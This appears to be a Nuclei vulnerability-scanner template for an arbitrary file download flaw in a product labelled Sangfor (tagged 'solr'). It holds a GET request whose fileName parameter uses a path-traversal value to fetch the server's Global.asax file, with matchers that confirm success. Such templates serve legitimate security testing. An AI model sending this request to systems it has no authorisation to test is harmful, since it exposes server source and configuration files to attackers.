id: sxf-filedownload
info:
  author: Str1am
  name: "\u6DF1\u4FE1\u670D\u6587\u4EF6\u4E0B\u8F7D"
  severity: high
  tags: solr
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - QiHang.Media.Web.Global
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fGlobal.asax'
